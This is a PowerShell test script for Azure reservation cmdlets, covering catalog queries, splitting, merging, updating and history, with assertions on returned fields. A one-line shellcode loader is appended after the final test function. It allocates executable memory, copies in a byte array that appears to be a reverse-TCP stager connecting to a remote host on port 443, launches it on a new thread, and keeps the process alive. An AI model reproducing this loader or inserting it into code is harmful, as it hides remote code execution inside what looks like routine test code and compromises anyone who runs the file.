

















$subscriptionId ="302110e3-cd4e-4244-9874-07c91853c809"
$reservationOrderId = "704aee8c-c906-47c7-bd22-781841fb48b5"
$reservationId = "ac7f6b04-ff45-4da1-83f3-b0f2f6c8128e"


function Test-GetCatalog
{
	
	$catalog = Get-AzReservationCatalog -SubscriptionId $subscriptionId -ReservedResourceType VirtualMachines -Location westus
	Foreach ($item in $catalog)
	{
		Assert-NotNull $item.ResourceType
		Assert-NotNull $item.Name
		Assert-True { $item.Terms.Count -gt 0 }
		Assert-True { $item.Locations.Count -gt 0 }
	}

	
	$catalog = Get-AzReservationCatalog -SubscriptionId $subscriptionId -ReservedResourceType SuseLinux
	Foreach ($item in $catalog)
	{
		Assert-NotNull $item.ResourceType
		Assert-NotNull $item.Name
		Assert-Null $item.Locations
		Assert-True { $item.Terms.Count -gt 0 }
	}

	
	$catalog = Get-AzReservationCatalog -SubscriptionId $subscriptionId -ReservedResourceType SqlDatabases -Location southeastasia
	Foreach ($item in $catalog)
	{
		Assert-NotNull $item.ResourceType
		Assert-NotNull $item.Name
		Assert-True { $item.Terms.Count -gt 0 }
		Assert-True { $item.Locations.Count -gt 0 }
	}

    
	$catalog = Get-AzReservationCatalog -SubscriptionId $subscriptionId -ReservedResourceType CosmosDb
	Foreach ($item in $catalog)
	{
		Assert-NotNull $item.ResourceType
		Assert-NotNull $item.Name
		Assert-True { $item.Terms.Count -gt 0 }
		Assert-Null $item.Locations
	}
}


function Test-GetReservationOrderId
{
	$appliedReservations = Get-AzReservationOrderId -SubscriptionId $subscriptionId

	$name = "default"
	$type = "Microsoft.Capacity/AppliedReservations"
	$id = "/subscriptions/" + $subscriptionId + "/providers/microsoft.capacity/AppliedReservations/default"

	Assert-AreEqual $id $appliedReservations.Id
	Assert-AreEqual $name $appliedReservations.Name
	Assert-AreEqual $type $appliedReservations.Type
}


function Test-SplitReservation
{
	$type = "Microsoft.Capacity/reservationOrders/reservations"

	$splitResult = Split-AzReservation -ReservationOrderId $reservationOrderId -ReservationId $reservationId -Quantity 1,1
	Foreach ($splitItem in $splitResult)
	{
		Assert-NotNull $splitItem
		Assert-True { $splitItem.Etag -gt 0}
		Assert-NotNull $splitItem.Id
		Assert-NotNull $splitItem.Name
		Assert-NotNull $splitItem.Sku
		Assert-AreEqual $splitItem.Type $type	 
	}
}


function Test-MergeReservation
{
	$reservationId1 = "efcd2077-baa6-4be3-8190-2b9ba939c8bc"
	$reservationId2 = "0281e256-5b31-424a-8df8-e67f6531113a"
	$type = "Microsoft.Capacity/reservationOrders/reservations"
	$mergeResult = Merge-AzReservation -ReservationOrderId $reservationOrderId -ReservationId $reservationId1,$reservationId2
	Foreach ($mergeItem in $mergeResult)
	{
		Assert-NotNull $mergeItem
		Assert-True { $mergeItem.Etag -gt 0}
		Assert-NotNull $mergeItem.Id
		Assert-NotNull $mergeItem.Name
		Assert-NotNull $mergeItem.Sku
		Assert-AreEqual $mergeItem.Type $type	 
	}
}
	

function Test-GetReservation
{
	$name = $reservationOrderId + '/' + $reservationId
	$type = "Microsoft.Capacity/reservationOrders/reservations"
	$id = "/providers/microsoft.capacity/reservationOrders/" + $reservationOrderId + "/reservations/" + $reservationId

	$reservationItem = Get-AzReservation -ReservationOrderId $reservationOrderId -ReservationId $reservationId

	Assert-NotNull $reservationItem
	Assert-NotNull $reservationItem.Etag
	Assert-AreEqual $reservationItem.Id $id
	Assert-AreEqual $reservationItem.Name $name
	Assert-NotNull $reservationItem.Sku
	Assert-AreEqual $reservationItem.Type $type	 

	
}


function Test-UpdateReservationToShared
{
	$type = "Microsoft.Capacity/reservationOrders/reservations"

	$reservationItem = Update-AzReservation -ReservationOrderId $reservationOrderId -ReservationId $reservationId -appliedscopetype Shared -InstanceFlexibility On

	Assert-NotNull $reservationItem
	Assert-NotNull $reservationItem.Etag

	$name = $reservationOrderId + '/' + $reservationId
	$id = "/providers/microsoft.capacity/reservationOrders/" + $reservationOrderId + "/reservations/" + $reservationId

	Assert-AreEqual $reservationItem.Id $id
	Assert-AreEqual $reservationItem.Name $name
	Assert-NotNull $reservationItem.Sku
	Assert-AreEqual $reservationItem.Type $type	 
}
	

function Test-UpdateReservationToSingle
{
	$type = "Microsoft.Capacity/reservationOrders/reservations"
	$subscription = "/subscriptions/302110e3-cd4e-4244-9874-07c91853c809"

	$reservationItem = Update-AzReservation -ReservationOrderId $reservationOrderId -ReservationId $reservationId -appliedscopetype Single -appliedscope $subscription -InstanceFlexibility On

	Assert-NotNull $reservationItem
	Assert-NotNull $reservationItem.Etag

	$name = $reservationOrderId + '/' + $reservationId
	$id = "/providers/microsoft.capacity/reservationOrders/" + $reservationOrderId + "/reservations/" + $reservationId

	Assert-AreEqual $reservationItem.Id $id
	Assert-AreEqual $reservationItem.Name $name
	Assert-NotNull $reservationItem.Sku
	Assert-AreEqual $reservationItem.Type $type	
}


function Test-ListReservations
{
	$name = $reservationOrderId + '/' + $reservationId
	$type = "Microsoft.Capacity/reservationOrders/reservations"
	$id = "/providers/microsoft.capacity/reservationOrders/" + $reservationOrderId + "/reservations/" + $reservationId

	$reservations = Get-AzReservation -ReservationOrderId $reservationOrderId

	Foreach($reservation in $reservations)
	{
		Assert-NotNull $reservation
		Assert-NotNull $reservation.Etag
		Assert-NotNull $reservation.Id
		Assert-NotNull $reservation.Name
		Assert-NotNull $reservation.Sku
		Assert-AreEqual $reservation.Type $type
	}
}


function Test-ListReservationHistory
{
	$type = "Microsoft.Capacity/reservationOrders/reservations/revisions"

	$reservationItemList = Get-AzReservationHistory -ReservationOrderId $reservationOrderId -ReservationId $reservationId

	Assert-NotNull $reservationItemList
	Assert-True {$reservationItemList.Count -ge 1}

	$reservationItem = $reservationItemList[0]
	Assert-NotNull $reservationItem.Etag

	$name = $reservationOrderId + '/' + $reservationId + '/' + $reservationItem.Etag
	$id = "/providers/microsoft.capacity/reservationOrders/" + $reservationOrderId + "/reservations/" + $reservationId + "/revisions/" + $reservationItem.Etag

	Assert-AreEqual $reservationItem.Id $id
	Assert-AreEqual $reservationItem.Name $name
	Assert-NotNull $reservationItem.Sku
	Assert-AreEqual $reservationItem.Type $type
}
$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x4e,0x26,0x3b,0x94,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

